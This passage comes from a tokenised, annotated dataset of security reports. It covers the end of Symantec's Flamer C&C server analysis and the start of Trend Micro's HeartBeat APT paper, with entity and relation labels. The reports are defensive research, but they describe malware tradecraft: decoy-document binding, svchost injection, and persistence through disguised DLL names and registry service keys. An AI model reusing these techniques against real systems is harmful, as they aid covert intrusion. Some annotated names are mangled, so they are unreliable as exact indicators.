"indicating", "multiple", "Flamer", "C&C", "server", "URLs", "were"], ["used", "to", "access", "this", "server", "."], ["Although", "only", "one", "encrypted", "file", "existed", "in", "the", "newsforyou/entries", "folder", "(the", "stolen", "data", "uploaded", "from", "the"], ["compromised", "clients)", ",", "the", "database", "reveals", "that", "189", "records", "had", "been", "created", ".", "The", "other", "188", "files", "had", "already", "been"], ["removed", "from", "the", "server", ".", "The", "entry", "left", "on", "the", "server", "had", "been", "successfully", "stolen", "from", "the", "computer", "located", "in"], ["Israel", "."], ["A", "final", "point", "to", "note", "here", "is", "in", "relation", "to", "the", "entry", "in", "the", "news_entries", "table", ".", "Only", "one", "record", "ever", "existed:", "the"], ["malicious", "payload", "to", "clean", "the", "computers", "up", ",", "uploaded", "on", "May", "18", ",", "2012", ",", "at", "13", ".", "43:45.", "This", "server", "only", "served", "up", "one"], ["package", "and", "it", "was", "uploaded", "as", "soon", "as", "the", "server", "had", "been", "initially", "configured", ".", "The", "last", "time", "a", "compromised", "client"], ["connected", "to", "the", "server", "was", "Friday", ",", "June", "1", ",", "2012", ",", "at", "11:42:47", ",", "and", "the", "last", "log", "recorded", "in", "the", "database", "was", "Friday", ","], ["June", "1", ",", "2012", ",", "at", "11:46:01", "."], ["Conclusion"], ["Examining", "the", "W32", ".", "Flamer", "servers", "has", "provided", "additional", "insight", "into", "the", "architecture", "of", "not", "only", "the", "threat", ",", "but"], ["also", "into", "the", "command", "structure", "of", "the", "entities", "behind", "it", ".", "The", "server", "code", "was", "written", "and", "updated", "by", "at", "least", "four"], ["separate", "individuals", ",", "indicating", "a", "continuing", "development", "effort", "to", "support", "W32", ".", "Flamer", "and", ",", "potentially", ",", "new", "or"], ["additional", "threats", "of", "a", "similar", "nature", ".", "The", "command-and-control", "Web", "application", "has", "been", "in", "active", "development", "for"], ["many", "years", ",", "possibly", "as", "early", "as", "2006", ",", "which", "is", "well", "before", "Flamer\u2019s", "earliest", "seen", "compilation", "date", "in", "2010", "."], ["The", "operators", "of", "the", "C&C", "servers", "may", "be", "a", "group", "of", "less", "senior", "individuals", ",", "working", "on", "a", "need-to-know", "basis", ",", "as", "the"], ["operator", "is", "not", "required", "(nor", "has", "the", "permission)", "to", "interpret", "the", "value", "or", "purpose", "of", "the", "incoming", "data", ".", "Only", "the"], ["attackers", "have", "the", "permission", "to", "access", "and", "interpret", "this", "data", ".", "This", "separation", "of", "operational", "and", "attacker", "visibility"], ["and", "roles", "indicates", "that", "this", "is", "the", "work", "of", "a", "highly", "organized", "and", "sophisticated", "group", ".", "The", "likelihood", "of", "a", "large", "and"], ["well-funded", "entity\u2019s", "involvement", "in", "Flamer", "is", "corroborated", "by", "the", "use", "of", "the", "unique", "certificate", "weakness", "used", "to"], ["hijack", "the", "Windows", "Update", "feature", "to", "spread", "across", "networks", "."], ["They", "were", "also", "careful", "to", "unload", "and", "archive", "data", "where", "necessary", ",", "remove", "duplicate", "files", ",", "and", "delete", "unnecessary"], ["files", "to", "prevent", "the", "server", "from", "running", "out", "of", "disk", "space", ".", "This", "was", "an", "ongoing", "development", "up", "to", "2011", ".", "R***\u2019s", "edits"], ["in", "the", "source", "code", "suggest", "the", "concern", "was", "less", "about", "updating", "protocols", "and", "more", "about", "ensuring", "there", "was", "ample"], ["room", "on", "the", "servers", "for", "the", "stolen", "data", "to", "be", "uploaded", "to", ",", "begging", "the", "question", "of", "how", "much", "data", "was", "actually", "being"], ["stolen", "."], ["This", "investigation", "simply", "provides", "a", "snapshot", "in", "time", "of", "the", "Flamer", "attack", "campaign", ".", "Considering", "that", "logging", "was"], ["disabled", "and", "data", "was", "wiped", "clean", "in", "such", "a", "thorough", "manner", ",", "the", "remaining", "clues", "make", "it", "virtually", "impossible", "to"], ["determine", "the", "entity", "behind", "the", "campaign", ".", "There", "is", "little", "doubt", "that", "the", "larger", "project", "involving", "cyber-espionage"], ["tools", ",", "such", "as", "Flamer", ",", "will", "continue", "to", "evolve", "and", "retrieve", "information", "from", "the", "designated", "targets", "."], ["Page", "18"], ["Security", "Response"], ["Have", "I", "Got", "Newsforyou:", "Analysis", "of", "Flamer", "C&C", "Server"], ["Resources"], ["Flamer:", "Highly", "Sophisticated", "and", "Discreet", "Threat", "Targets", "the", "Middle", "East"], ["http://symantec", ".", "com/connect/blogs/flamer-highly-sophisticated-and-discreet-threat-targets-middle-east"], ["Painting", "a", "Picture", "of", "W32", ".", "Flamer"], ["http://symantec", ".", "com/connect/blogs/painting-picture-w32flamer"], ["Flamer:", "A", "Recipe", "for", "Bluetoothache"], ["http://symantec", ".", "com/connect/blogs/flamer-recipe-bluetoothache"], ["W32", ".", "Flamer:", "Spreading", "Mechanism", "Tricks", "and", "Exploits"], ["http://symantec", ".", "com/connect/blogs/w32flamer-spreading-mechanism-tricks-and-exploits"], ["W32", ".", "Flamer:", "Leveraging", "Microsoft", "Digital", "Certificates"], ["http://symantec", ".", "com/connect/blogs/w32flamer-leveraging-microsoft-digital-certificates"], ["W32", ".", "Flamer:", "Microsoft", "Windows", "Update", "Man-in-the-Middle"], ["http://symantec", ".", "com/connect/blogs/w32flamer-microsoft-windows-update-man-middle"], ["W32", ".", "Flamer:", "Enormous", "Data", "Collection"], ["http://symantec", ".", "com/connect/blogs/w32flamer-enormous-data-collection"], ["Flamer:", "Urgent", "Suicide"], ["http://symantec", ".", "com/connect/blogs/flamer-urgent-suicide"], ["Page", "19"], ["Security", "Response"], ["Any", "technical", "information", "that", "is", "made", "available", "by", "Symantec", "Corporation", "is", "the", "copyrighted", "work", "of", "Symantec", "Corporation", "and", "is", "owned", "by", "Symantec"], ["Corporation", "."], ["NO", "WARRANTY", "", ".", "The", "technical", "information", "is", "being", "delivered", "to", "you", "as", "is", "and", "Symantec", "Corporation", "makes", "no", "warranty", "as", "to", "its", "accuracy", "or", "use", ".", "Any", "use", "of", "the"], ["technical", "documentation", "or", "the", "information", "contained", "herein", "is", "at", "the", "risk", "of", "the", "user", ".", "Documentation", "may", "include", "technical", "or", "other", "inaccuracies", "or", "typographical"], ["errors", ".", "Symantec", "reserves", "the", "right", "to", "make", "changes", "without", "prior", "notice", "."], ["About", "Symantec"], ["Symantec", "is", "a", "global", "leader", "in"], ["providing", "security", ",", "storage", "and"], ["systems", "management", "solutions", "to"], ["help", "businesses", "and", "consumers"], ["secure", "and", "manage", "their", "information", "."], ["Headquartered", "in", "Mountain", "View", ",", "Calif", ".", ","], ["Symantec", "has", "operations", "in", "more"], ["than", "40", "countries", ".", "More", "information"], ["is", "available", "at", "www", ".", "symantec.com."], ["For", "specific", "country", "offices", "and", "contact", "numbers", ",", "please", "visit", "our", "Web", "site", ".", "For", "product"], ["information", "in", "the", "U", ".", "S.,", "call"], ["toll-free", "1", "(800)", "745", "6054", "."], ["Symantec", "Corporation"], ["World", "Headquarters"], ["350", "Ellis", "Street"], ["Mountain", "View", ",", "CA", "94043", "USA"], ["+1", "(650)", "527-8000"], ["www", ".", "symantec.com"], ["Copyright", "\u00a9", "2012", "Symantec", "Corporation", ".", "All", "rights", "reserved", "."], ["Symantec", "and", "the", "Symantec", "logo", "are", "trademarks", "or", "registered"], ["trademarks", "of", "Symantec", "Corporation", "or", "its", "affiliates", "in", "the"], ["U", ".", "S.", "and", "other", "countries", ".", "Other", "names", "may", "be", "trademarks", "of"], ["their", "respective", "owners", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Campaign", "name": "HeartBeat", "sent_id": 28, "pos": []}, {"old_id": "T2", "type": "Time", "name": "2009", "sent_id": 30, "pos": [5]}, {"old_id": "T3", "type": "Malware", "name": "remote administration tool", "sent_id": 42, "pos": [3, 5]}, {"old_id": "T4", "type": "Campaign", "name": "HeartBeat", "sent_id": 39, "pos": [7]}, {"old_id": "T5", "type": "Campaign", "name": "Luckycat", "sent_id": 52, "pos": [6]}, {"old_id": "T6", "type": "Country", "name": "India", "sent_id": 54, "pos": [3]}, {"old_id": "T7", "type": "Country", "name": "Japan", "sent_id": 54, "pos": [5]}, {"old_id": "T8", "type": "ExploitTargetObject", "name": "Tibetan activists\u2019 community", "sent_id": 55, "pos": [3, 5]}, {"old_id": "T9", "type": "ExploitTargetObject", "name": "aerospace energy engineering shipping and military research industries", "sent_id": 53, "pos": []}, {"old_id": "T10", "type": "Campaign", "name": "IXESHE", "sent_id": 56, "pos": [0]}, {"old_id": "T11", "type": "ExploitTargetObject", "name": "East Asian governments", "sent_id": 56, "pos": []}, {"old_id": "T12", "type": "ExploitTargetObject", "name": "Taiwanese electronics manufacturers", "sent_id": 57, "pos": [2, 4]}, {"old_id": "T13", "type": "ExploitTargetObject", "name": "telecommunications company", "sent_id": 58, "pos": [2, 3]}, {"old_id": "T14", "type": "Campaign", "name": "Taidoor", "sent_id": 61, "pos": [4]}, {"old_id": "T15", "type": "Country", "name": "Taiwan", "sent_id": 63, "pos": [0]}, {"old_id": "T16", "type": "Country", "name": "South Korea", "sent_id": 66, "pos": []}, {"old_id": "T17", "type": "Campaign", "name": "HeartBeat", "sent_id": 67, "pos": []}, {"old_id": "T18", "type": "Campaign", "name": "HeartBeat", "sent_id": 77, "pos": [1]}, {"old_id": "T19", "type": "Time", "name": "June 2012", "sent_id": 82, "pos": [4, 5]}, {"old_id": "T20", "type": "Time", "name": "November 2009", "sent_id": 87, "pos": [5, 6]}, {"old_id": "T21", "type": "ExploitTargetObject", "name": "Political parties", "sent_id": 90, "pos": [1, 2]}, {"old_id": "T22", "type": "ExploitTargetObject", "name": "Media outfits", "sent_id": 91, "pos": [1, 2]}, {"old_id": "T23", "type": "ExploitTargetObject", "name": "A national policy research institute", "sent_id": 92, "pos": [1, 5]}, {"old_id": "T24", "type": "ExploitTargetObject", "name": "A military branch of South Korean armed forces", "sent_id": 93, "pos": [1, 8]}, {"old_id": "T25", "type": "Campaign", "name": "HeartBeat", "sent_id": 94, "pos": [4]}, {"old_id": "T27", "type": "Campaign", "name": "HeartBeat", "sent_id": 116, "pos": [4]}, {"old_id": "T26", "type": "Email", "name": "spearphishing emails", "sent_id": 122, "pos": []}, {"old_id": "T28", "type": "Software", "name": "Smart Protection Network", "sent_id": 154, "pos": []}, {"old_id": "T29", "type": "Organization", "name": "Trend Micro", "sent_id": 154, "pos": []}, {"old_id": "T30", "type": "File", "name": "%Program Files%\\Common Files\\Services\\6to4ntdll", "sent_id": 182, "pos": []}, {"old_id": "T31", "type": "File", "name": "%Program Files%\\Common Files\\System\\6to4ntdll", "sent_id": 183, "pos": []}, {"old_id": "T32", "type": "File", "name": "%Program Files%\\Windows NT\\Accessories\\6to4ntdll", "sent_id": 184, "pos": []}, {"old_id": "T33", "type": "File", "name": "%Program Files%\\Windows NT\\htrndll", "sent_id": 185, "pos": []}, {"old_id": "T34", "type": "File", "name": "%Program Files%\\Windows NT\\htrn_jlsdll", "sent_id": 186, "pos": []}, {"old_id": "T35", "type": "File", "name": "%Program Files%\\Windows NT\\hyperdll", "sent_id": 187, "pos": []}, {"old_id": "T36", "type": "File", "name": "%System%\\Network Remotedll", "sent_id": 188, "pos": []}, {"old_id": "T37", "type": "File", "name": "%System%\\SvcHostdll", "sent_id": 189, "pos": []}, {"old_id": "T38", "type": "Malware", "name": "RAT", "sent_id": 178, "pos": [1]}, {"old_id": "T39", "type": "File", "name": "%System%\\msrtexe", "sent_id": 206, "pos": []}, {"old_id": "T40", "type": "File", "name": "%Program Files%\\Common Files\\AcroRd32exe", "sent_id": 207, "pos": []}, {"old_id": "T41", "type": "File", "name": "%Program Files%\\Common Files\\configexe", "sent_id": 208, "pos": []}, {"old_id": "T42", "type": "Malware", "name": "RAT", "sent_id": 204, "pos": [1]}, {"old_id": "T43", "type": "Indicator", "name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name} Type = \u201c20\u201d Start = \u201c2\u201d ErrorControl = \u201c1\u201d ImagePath = \u201c%SystemRoot%\\System32\\svchostexe -k netsvcs\u201d ObjectName = \u201cLocalSystem\u201d", "sent_id": 217, "pos": []}, {"old_id": "T44", "type": "Indicator", "name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\\Parameters ServiceDll = C:\\Program Files\\Windows NT\\htrn dll", "sent_id": 225, "pos": []}, {"old_id": "T45", "type": "Indicator", "name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\\Security Security = {values}", "sent_id": 229, "pos": []}, {"old_id": "T46", "type": "Indicator", "name": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\ Services\\{service name}\\Enum 0 = \u201cRoot\\LEGACY_{service name}\\0000\u201d Count = \u201c1\u201d NextInstance = \u201c1\u201d *{service name} may be \u201c6to4\u201d \u201cIas\u201d or \u201cIrmon\u201d", "sent_id": 232, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "qawsed", "sent_id": 248, "pos": []}, {"old_id": "T48", "type": "Indicator", "name": "army-1022", "sent_id": 303, "pos": []}, {"old_id": "T49", "type": "Malware", "name": "HeartBeat", "sent_id": 296, "pos": [0]}, {"old_id": "T50", "type": "Country", "name": "Armenia", "sent_id": 308, "pos": [4]}, {"old_id": "T51", "type": "Country", "name": "USA", "sent_id": 308, "pos": [6]}, {"old_id": "T52", "type": "Country", "name": "Japan", "sent_id": 308, "pos": [8]}, {"old_id": "T53", "type": "Country", "name": "India", "sent_id": 308, "pos": [10]}, {"old_id": "T54", "type": "Country", "name": "Korea", "sent_id": 309, "pos": [0]}, {"old_id": "T55", "type": "Campaign", "name": "HeartBeat", "sent_id": 306, "pos": [1]}], "labels": [{"old_id": "R1", "r": "P33", "h": 0, "t": 1, "evidence": [28, 29, 30]}, {"old_id": "R2", "r": "P22", "h": 3, "t": 2, "evidence": [39, 40, 41, 42]}, {"old_id": "R3", "r": "P32", "h": 4, "t": 5, "evidence": [52, 53, 54]}, {"old_id": "R4", "r": "P32", "h": 4, "t": 6, "evidence": [52, 53, 54]}, {"old_id": "R5", "r": "P27", "h": 4, "t": 7, "evidence": [52, 53, 54, 55]}, {"old_id": "R6", "r": "P27", "h": 4, "t": 8, "evidence": [52, 53]}, {"old_id": "R7", "r": "P27", "h": 9, "t": 10, "evidence": [56]}, {"old_id": "R8", "r": "P27", "h": 9, "t": 11, "evidence": [56, 57]}, {"old_id": "R9", "r": "P27", "h": 9, "t": 12, "evidence": [56, 57, 58]}, {"old_id": "R10", "r": "P32", "h": 13, "t": 14, "evidence": [61, 62, 63]}, {"old_id": "R11", "r": "P32", "h": 16, "t": 15, "evidence": []}, {"old_id": "R12", "r": "P33", "h": 17, "t": 18, "evidence": [77, 78, 79, 80, 81, 82]}, {"old_id": "R13", "r": "P33", "h": 17, "t": 19, "evidence": [77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87]}, {"old_id": "R14", "r": "P27", "h": 24, "t": 20, "evidence": []}, {"old_id": "R15", "r": "P27", "h": 24, "t": 21, "evidence": []}, {"old_id": "R16", "r": "P27", "h": 24, "t": 22, "evidence": []}, {"old_id": "R17", "r": "P27", "h": 24, "t": 23, "evidence": []}, {"old_id": "R18", "r": "P17", "h": 28, "t": 27, "evidence": [154]}, {"old_id": "R19", "r": "P21", "h": 29, "t": 37, "evidence": []}, {"old_id": "R20", "r": "P21", "h": 30, "t": 37, "evidence": []}, {"old_id": "R21", "r": "P21", "h": 31, "t": 37, "evidence": []}, {"old_id": "R22", "r": "P21", "h": 32, "t": 37, "evidence": []}, {"old_id": "R23", "r": "P21", "h": 33, "t": 37, "evidence": []}, {"old_id": "R24", "r": "P21", "h": 34, "t": 37, "evidence": []}, {"old_id": "R25", "r": "P21", "h": 35, "t": 37, "evidence": []}, {"old_id": "R26", "r": "P21", "h": 36, "t": 37, "evidence": []}, {"old_id": "R27", "r": "P21", "h": 38, "t": 41, "evidence": []}, {"old_id": "R28", "r": "P21", "h": 39, "t": 41, "evidence": []}, {"old_id": "R29", "r": "P21", "h": 40, "t": 41, "evidence": []}, {"old_id": "R30", "r": "P21", "h": 47, "t": 48, "evidence": []}, {"old_id": "R31", "r": "P32", "h": 54, "t": 49, "evidence": [306, 307, 308]}, {"old_id": "R32", "r": "P32", "h": 54, "t": 50, "evidence": [306, 307, 308]}, {"old_id": "R33", "r": "P32", "h": 54, "t": 53, "evidence": [306, 307, 308, 309]}, {"old_id": "R34", "r": "P32", "h": 54, "t": 51, "evidence": [306, 307, 308]}, {"old_id": "R35", "r": "P32", "h": 54, "t": 52, "evidence": [306, 307, 308]}], "title": ["inputs/txt/201201TrendMicroHeartBeat"], "sents": [["Trend", "Micro", "Incorporated"], ["Research", "Paper"], ["2012"], ["The", "HeartBeat", "APT"], ["Campaign"], ["Roland", "Dela", "Paz"], ["Contents"], ["About", "This", "Paper", ".", "..................................................................................................................................", "1"], ["Introduction", ".", "...........................................................................................................................................", "1"], ["Campaign", "Targets", ".", "................................................................................................................................", "2"], ["Context", ".", "...................................................................................................................................................", "2"], ["Attack", "Vector", ".", "........................................................................................................................................", "3"], ["Infection", "Flow", ".", ".......................................................................................................................................4"], ["The", "RAT", "Component", ".", "...........................................................................................................................", "5"], ["Backdoor", "Functionalities", ".", "............................................................................................................", "5"], ["Installation", "and", "Persistence", ".", ".......................................................................................................", "5"], ["C&C", "Communication", ".", "....................................................................................................................", "6"], ["Command", "and", "Control", ".", "........................................................................................................................8"], ["HeartBeat", "Campaign", "Codes", "and", "Decoy", "Documents", ".", "...................................................................8"], ["Relationships", "among", "C&C", "Domains", ",", "IPs", ",", "and", "Campaigns", ".", "..........................................................", "9"], ["Attribution", ".", "............................................................................................................................................10"], ["Conclusion", ".", "............................................................................................................................................10"], ["Timeline", ".", ".................................................................................................................................................10"], ["Defending", "against", "the", "HeartBeat", "Campaign", ".", "................................................................................11"], ["Trend", "Micro", "Threat", "Protection", "Against", "The", "HeartBeat", "Campaign", "Components", ".", "................12"], ["PAGE", "ii", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["About", "This", "Paper"], ["Introduction"], ["This", "paper", "exposes", "a", "targeted", "attack", "called", "\u201cHeartBeat", ",", "\u201d"], ["which", "has", "been", "persistently", "pursuing", "the", "South", "Korean"], ["government", "and", "related", "organizations", "since", "2009", ".", "This"], ["paper", "will", "discuss", "how", "their", "specifically", "crafted", "campaigns"], ["infiltrate", "their", "targets", "."], ["Today\u2019s", "cybercriminals", "try", "to", "infect", "as", "many", "users", "as"], ["possible", ".", "Their", "goal", "is", "simple\u2014to", "monetize", "the", "resources", "or"], ["data", "from", "infected", "machines", "in", "any", "way", "they", "can", ".", "Behind"], ["such", "attacks", "are", "highly", "covert", "targeted", "campaigns", "known"], ["as", "APTs", "."], ["Compared", "to", "most", "advanced", "persistent", "threat", "(APT)"], ["campaigns", "with", "diverse", "targeted", "industries", ",", "the", "HeartBeat"], ["campaign", "is", "an", "isolated", "case", ".", "Furthermore", ",", "we", "will", "examine"], ["their", "attack", "methodologies", "which", "include", "their", "attack"], ["vector", ",", "the", "remote", "administration", "tool", "(RAT)", "component", ","], ["and", "command-and-control", "servers", ".", "Finally", ",", "we", "will", "discuss"], ["how", "this", "information", "can", "be", "useful", "in", "developing", "defensive"], ["strategies", "in", "protecting", "organizations", "as", "well", "as", "predicting"], ["future", "targets", "."], ["While", "targeted", "campaigns", "continue", "to", "increase", ",", "research"], ["efforts", "by", "the", "security", "industry", "reveal", "that", "some", "of", "these"], ["attacks", "have", "existed", "for", "several", "years", ".", "1", "Depending", "on", "the"], ["motive", ",", "APT", "campaigns", "may", "attack", "various", "industries", ","], ["organizations", "or", "communities", "from", "different", "regions", "and"], ["countries", ".", "For", "instance", ",", "the", "Luckycat", "campaign", "targeted"], ["the", "aerospace", ",", "energy", ",", "engineering", ",", "shipping", ",", "and", "military"], ["research", "industries", "in", "India", "and", "Japan", ".", "2", "Additionally", ","], ["they", "targeted", "the", "Tibetan", "activists\u2019", "community", ".", "The"], ["IXESHE", "campaign", ",", "on", "the", "other", "hand", ",", "targeted", "East", "Asian"], ["governments", ",", "Taiwanese", "electronics", "manufacturers", ","], ["and", "a", "telecommunications", "company", ".", "3", "While", "most", "of"], ["these", "campaigns", "have", "multiple", "targets", ",", "smaller", ",", "more"], ["subtle", "campaigns", "with", "exceedingly", "specific", "targets", "are"], ["also", "present", ".", "The", "Taidoor", "campaign", "is", "an", "example", "of"], ["this", ",", "where", "all", "of", "the", "compromise", "victims", "were", "from"], ["Taiwan", ",", "and", "the", "majority", "of", "which", "were", "government"], ["organizations", ".", "4"], ["This", "research", "paper", "will", "delve", "into", "a", "targeted", "campaign"], ["that", "targets", "organizations", "and", "communities", "within", "South"], ["Korea", ".", "We", "call", "this", "malicious", "operation", "the", "\u201cHeartBeat"], ["campaign", ".", "\u201d"], ["1"], ["http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_dissecting-lurid-apt.pdf"], ["2", "http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_luckycat_redux.pdf"], ["3", "http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_ixeshe.pdf"], ["4", "http://www", ".", "trendmicro.com/cloud-content/us/pdfs/securityintelligence/white-papers/wp_the_taidoor_campaign.pdf"], ["PAGE", "1", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Campaign", "Targets"], ["Context"], ["The", "HeartBeat", "campaign", "appears", "to", "target", "government"], ["organizations", "and", "institutions", "or", "communities", "that", "are"], ["in", "some", "way", "related", "to", "the", "South", "Korean", "government", "."], ["Specifically", ",", "we", "were", "able", "to", "identify", "the", "following", "targets:"], ["The", "first", "HeartBeat", "campaign", "remote", "access", "tool", "(RAT)5"], ["component", "was", "discovered", "in", "June", "2012", "in", "a", "Korean"], ["newspaper", "company", "network", ".", "Further", "investigation"], ["revealed", "that", "the", "campaign", "has", "been", "actively", "distributing"], ["their", "RAT", "component", "to", "their", "targets", "in", "2011", "and", "the", "first"], ["half", "of", "2012", ".", "Furthermore", ",", "we", "uncovered", "one", "malware"], ["component", "that", "dates", "back", "to", "November", "2009", ".", "This"], ["indicates", "that", "the", "campaign", "started", "during", "that", "time", "or"], ["earlier", "."], ["\u2022", "Political", "parties"], ["\u2022", "Media", "outfits"], ["\u2022", "A", "national", "policy", "research", "institute"], ["\u2022", "A", "military", "branch", "of", "South", "Korean", "armed", "forces"], ["Earlier", "versions", "of", "the", "HeartBeat", "campaign\u2019s", "RAT"], ["component", "contained", "the", "following", "strings", "in", "their", "codes:"], ["\u2022", "A", "small", "business", "sector", "organization"], ["Thus", ",", "the", "campaign", "name", "\u201cHeartBeat", ".", "\u201d"], ["\u2022", "Branches", "of", "South", "Korean", "government"], ["The", "profile", "of", "their", "targets", "suggests", "that", "the", "motive"], ["behind", "the", "campaign", "may", "be", "politically", "motivated", "."], ["Figure", "1", ".", "Code", "used", "in", "the", "HeartBeat", "campaign\u2019s", "RAT", "component"], ["5", "http://en", ".", "wikipedia.org/wiki/Remote_administration_software"], ["PAGE", "2", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Attack", "Vector"], ["In", "order", "to", "gain", "control", "over", "targets", "systems", ",", "HeartBeat"], ["perpetrators", "install", "a", "RAT", "in", "prospective", "victims\u2019", "systems", "."], ["This", "RAT", "arrives", "as", "a", "disguised", "or", "fake", "document", "which"], ["is", "actually", "a", "bundled", "file", ".", "The", "bundled", "file", "contains", "both"], ["a", "decoy", "document", "and", "the", "RAT", "installer", "that", "has", "been"], ["packaged", "together", "using", "a", "binder", "tool", ".", "Once", "it", "runs", ",", "the"], ["decoy", "document", "is", "displayed", "to", "the", "user", "while", "the", "RAT"], ["unknowingly", "executes", "in", "the", "background", "."], ["Based", "on", "the", "samples", "we", "collected", ",", "the", "campaign\u2019s", "decoy"], ["documents", "used", "the", "file", "formats", "", ".", "JPG,", "", ".", "PDF,", "XLS", ",", "and", "HWP", ","], ["the", "Korean", "government", "standard", "word", "processor", "format", "."], ["One", "of", "the", "previous", "HeartBeat", "attacks", "even", "dropped", "a"], ["pornographic", "", ".", "JPG", "image", "as", "decoy", ".", "Below", "is", "a", "screenshot"], ["of", "a", "Hangul", "Word", "Processor", "(", ".", "HWP)", "document", "used", "as", "bait"], ["in", "November", "2011", ".", "Its", "document", "title", "roughly", "translates", "to"], ["\u201cInformation", "to", "the", "President", ".", "hwp.\u201d"], ["It", "is", "unclear", "how", "these", "packaged", "files", "specifically", "arrive", "on"], ["victims\u2019", "systems", ",", "but", "we", "highly", "suspect", "that", "spearphishing"], ["emails6", "containing", "these", "packaged", "malware", "were", "primarily"], ["used", "to", "distribute", "them", ".", "In", "fact", ",", "the", "packaged", "malware"], ["used", "the", "icon", "of", "the", "decoy", "document", "in", "order", "to", "look"], ["legitimate", ".", "For", "instance", ",", "if", "the", "decoy", "is", "an", "XLS", "file", ",", "the"], ["package", "will", "appear", "to", "have", "an", "XLS", "document", "icon", ".", "In"], ["addition", ",", "some", "of", "the", "decoy", "files", "required", "passwords", "in"], ["order", "to", "be", "viewed", "."], ["Figure", "3", ".", "A", "decoy", "", ".", "HWP", "document"], ["Figure", "2", ".", "Example", "of", "a", "decoy", "Adobe", "Reader", "document"], ["The", "previously", "mentioned", "techniques", "are", "commonly", "used"], ["in", "spearphishing", "attacks", "where", "prospective", "victims", "are"], ["lured", "to", "open", "a", "seemingly", "benign", "document", "attachment", "."], ["In", "order", "to", "appear", "more", "legitimate", ",", "some", "of", "these", "emails"], ["contain", "password", "protected", "documents", ".", "A", "password", "is"], ["then", "provided", "in", "the", "email", "body", "as", "a", "social", "engineering"], ["technique", "."], ["6", "http://blog", ".", "trendmicro.com/taiwan-spear-phishers-target-gmail-users/"], ["PAGE", "3", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["Infection", "Flow"], ["Once", "users", "open", "the", "packaged", "malicious", "file", ",", "the", "actual", "document", "is", "displayed", "to", "the", "user", "while", "a", "RAT", "installer", "in"], ["", ".", "EXE", "format", "runs", "in", "the", "background", ".", "The", "RAT", "installer", ",", "on", "the", "other", "hand", ",", "drops", "a", "", ".", "DLL", "file", "that", "is", "then", "injected", "to", "the"], ["legitimate", "process", "svchost", ".", "exe.", "The", "injected", "code", "in", "svchost", ".", "exe", "then", "connects", "to", "the", "malware", "command", "and", "control"], ["(C&C)", "server", "to", "register", "infection", "and", "wait", "for", "remote", "commands", "."], ["Figure", "4", ".", "Infection", "diagram", "for", "the", "HeartBeat", "campaign"], ["TREND", "MICRO", "INCORPORATED"], ["TREND", "MICRO", "INC", "."], ["Trend", "Micro", "Incorporated", "(TYO:", "4704;", "TSE:", "4704)", ",", "a", "global", "cloud", "security"], ["leader", ",", "creates", "a", "world", "safe", "for", "exchanging", "digital", "information", "with", "its", "Internet", "content", "security", "and", "threat", "management", "solutions", "for", "businesses"], ["and", "consumers", ".", "A", "pioneer", "in", "server", "security", "with", "over"], ["20", "years\u2019", "experience", ",", "we", "deliver", "top-ranked", "client", ",", "server", "and", "cloudbased", "security", "that", "fits", "our", "customers\u2019", "and", "partners\u2019", "needs", ",", "stops"], ["new", "threats", "faster", ",", "and", "protects", "data", "in", "physical", ",", "virtualized", "and", "cloud"], ["environments", ".", "Powered", "by", "the", "industry-leading", "Trend", "Micro\u2122", "Smart", "Protection", "Network\u2122", "cloud", "computing", "security", "infrastructure", ",", "our", "products"], ["and", "services", "stop", "threats", "where", "they", "emerge\u2014from", "the", "Internet", ".", "They", "are"], ["supported", "by", "1", ",", "000+", "threat", "intelligence", "experts", "around", "the", "globe", "."], ["10101", "N", ".", "De", "Anza", "Blvd", "."], ["Cupertino", ",", "CA", "95014"], ["U", ".", "S.", "toll", "free:", "1", "+800", ".", "228.5651"], ["Phone:", "1", "+408", ".", "257.1500"], ["Fax:", "1", "+408", ".", "257.2003"], ["www", ".", "trendmicro.com"], ["\u00a92012", "by", "Trend", "Micro", ",", "Incorporated", ".", "All", "rights", "reserved", ".", "Trend", "Micro", "and", "the", "Trend", "Micro", "t-ball", "logo", "are", "trademarks", "or", "registered", "trademarks", "of", "Trend", "Micro", ",", "Incorporated", ".", "All", "other", "product", "or", "company"], ["names", "may", "be", "trademarks", "or", "registered", "trademarks", "of", "their", "owners", "."], ["PAGE", "4", "|", "THE", "HEARTBEAT", "APT", "CAMPAIGN"], ["The", "RAT", "Component"], ["Backdoor", "Functionalities"], ["The", "HeartBeat", "campaign\u2019s", "RAT", "component", "allows"], ["attackers", "to", "remotely", "execute", "the", "following", "commands", "on"], ["affected", "hosts:"], ["\u2022", "List", "running", "processes", "and", "their", "respective", "process"], ["IDs"], ["\u2022", "Download", "and", "execute", "file(s)"], ["\u2022", "Update", "itself"], ["\u2022", "Uninstall", "itself"], ["\u2022", "Create", "or", "terminate", "a", "process"], ["\u2022", "List", "available", "removable", "and", "fixed", "drives"], ["The", "RAT", "installer", "in", "turn", "drops", "a", "", ".", "DLL", "component", "which"], ["contains", "the", "backdoor", "capabilities", ".", "In", "order", "to", "stay", "hidden", ","], ["the", "", ".", "DLL", "uses", "file", "names", "similar", "to", "legitimate", "applications", "."], ["Below", "is", "a", "list", "of", "file", "names", "used:"], ["\u2022", "%Program", "Files%\\Common", "Files\\Services\\6to4nt", ".", "dll"], ["\u2022", "%Program", "Files%\\Common", "Files\\System\\6to4nt", ".", "dll"], ["\u2022", "%Program", "Files%\\Windows", "NT\\Accessories\\6to4nt", ".", "dll"], ["\u2022", "%Program", "Files%\\Windows", "NT\\htrn", ".", "dll"], ["\u2022", "%Program", "Files%\\Windows", "NT\\htrn_jls", ".", "dll"], ["\u2022", "%Program", "Files%\\Windows", "NT\\hyper", ".", "dll"], ["\u2022", "%System%\\Network", "Remote", ".", "dll"], ["\u2022", 